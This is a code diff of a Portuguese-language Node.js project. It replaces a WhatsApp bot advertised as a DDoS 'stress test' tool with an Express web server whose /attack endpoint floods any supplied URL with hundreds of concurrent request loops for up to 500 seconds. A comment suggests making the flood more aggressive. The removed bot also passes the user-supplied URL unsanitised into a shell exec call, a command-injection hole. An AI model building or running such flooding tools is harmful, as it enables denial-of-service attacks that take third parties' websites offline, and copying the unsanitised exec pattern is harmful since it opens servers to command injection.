@@ -1,103 +1,65 @@
-const { default: makeWASocket, useSingleFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
-const { Boom } = require('@hapi/boom');
 const express = require('express');
-const { exec } = require('child_process');
-const fs = require('fs');
+const axios = require('axios');
+const app = express();
+const port = process.env.PORT || 3000;
 
-const { state, saveState } = useSingleFileAuthState('./auth.json');
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public'));
 
-const sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: true,
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Função simples para flood (ataque simulado)
+// Você pode trocar por algo mais agressivo depois
+async function flood(url, tempo, threads) {
+  const endTime = Date.now() + tempo * 1000;
+  
+  // Função que faz requisição contínua
+  async function attackThread() {
+    while (Date.now() < endTime) {
+      try {
+        await axios.get(url);
+      } catch (e) {
+        // ignorar erros para continuar flood
+      }
+    }
+  }
+
+  // Dispara X threads
+  let promises = [];
+  for (let i = 0; i < threads; i++) {
+    promises.push(attackThread());
+  }
+  
+  await Promise.all(promises);
+}
+
+app.post('/attack', async (req, res) => {
+  const { url, tempo, threads } = req.body;
+
+  // Validações básicas
+  if (!url || (!url.startsWith('http://') && !url.startsWith('https://'))) {
+    return res.status(400).json({ error: 'URL inválida. Precisa começar com http:// ou https://' });
+  }
+  const timeNum = Number(tempo);
+  const threadsNum = Number(threads);
+
+  if (isNaN(timeNum) || timeNum < 1 || timeNum > 500) {
+    return res.status(400).json({ error: 'Tempo inválido. Mínimo 1, máximo 500 segundos.' });
+  }
+  if (isNaN(threadsNum) || threadsNum < 1 || threadsNum > 700) {
+    return res.status(400).json({ error: 'Threads inválidas. Mínimo 1, máximo 700.' });
+  }
+
+  // Resposta imediata
+  res.json({ message: `Iniciando ataque em ${url} por ${timeNum}s com ${threadsNum} threads` });
+
+  // Rodar ataque async sem bloquear resposta
+  flood(url, timeNum, threadsNum).catch(console.error);
 });
 
-sock.ev.on('creds.update', saveState);
-
-sock.ev.on('connection.update', (update) => {
-    const { connection, lastDisconnect } = update;
-    if(connection === 'close') {
-        const shouldReconnect = (lastDisconnect.error instanceof Boom) 
-            ? lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut
-            : true;
-        console.log('Conexão fechada devido a', lastDisconnect.error, ', reconectando...', shouldReconnect);
-        if(shouldReconnect) {
-            startSock();
-        }
-    } else if(connection === 'open') {
-        console.log('Conexão aberta');
-    }
-});
-
-sock.ev.on('messages.upsert', async ({ messages }) => {
-    const m = messages[0];
-    if (!m.message) return;
-
-    const msg = m.message.conversation || m.message.extendedTextMessage?.text || '';
-    const sender = m.key.remoteJid;
-
-    console.log('Mensagem recebida:', msg);
-
-    if (msg.toLowerCase() === '!start') {
-        await sock.sendMessage(sender, {
-            text: 
-`🔥 *McFly System Down*
-
-👨‍💻 Sou um bot de *testes de stress* DDoS.
-
-🛠️ *Comando disponível:*
-
-➤ !stress (url) (tempo-em-segundos) (quantidade-de-threads)
-
-🧠 *Exemplo:*
-!stress https://seusite.com 60 50
-
-🚫 *Limites:*
-- Tempo máximo: 600 segundos
-- Threads máximas: 800
-
-⚠️ *Uso exclusivo para testes em sites autorizados pela sua equipe.*`
-        });
-    }
-
-    if (msg.startsWith('!stress')) {
-        const args = msg.split(' ');
-
-        if (args.length !== 4) {
-            await sock.sendMessage(sender, { text: '❌ Formato inválido!\n✅ Exemplo correto:\n!stress https://site.com 60 50' });
-            return;
-        }
-
-        const url = args[1];
-        const tempo = parseInt(args[2]);
-        const threads = parseInt(args[3]);
-
-        if (isNaN(tempo) || isNaN(threads)) {
-            await sock.sendMessage(sender, { text: '❌ Tempo e Threads devem ser números!' });
-            return;
-        }
-
-        if (tempo > 600) {
-            await sock.sendMessage(sender, { text: '❌ Tempo máximo permitido é 600 segundos!' });
-            return;
-        }
-
-        if (threads > 800) {
-            await sock.sendMessage(sender, { text: '❌ Máximo de threads permitido é 800!' });
-            return;
-        }
-
-        await sock.sendMessage(sender, { text: `🚀 Ataque iniciado em: ${url} \n⏳ Duração: ${tempo}s \n💥 Threads: ${threads}` });
-
-        exec(`node attack.js ${url} ${tempo} ${threads}`, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Erro: ${error.message}`);
-                sock.sendMessage(sender, { text: `❌ Ocorreu um erro ao iniciar o ataque.` });
-                return;
-            }
-            if (stderr) {
-                console.error(`stderr: ${stderr}`);
-            }
-            console.log(`stdout: ${stdout}`);
-        });
-    }
+app.listen(port, () => {
+  console.log(`Servidor rodando na porta ${port}`);
 });
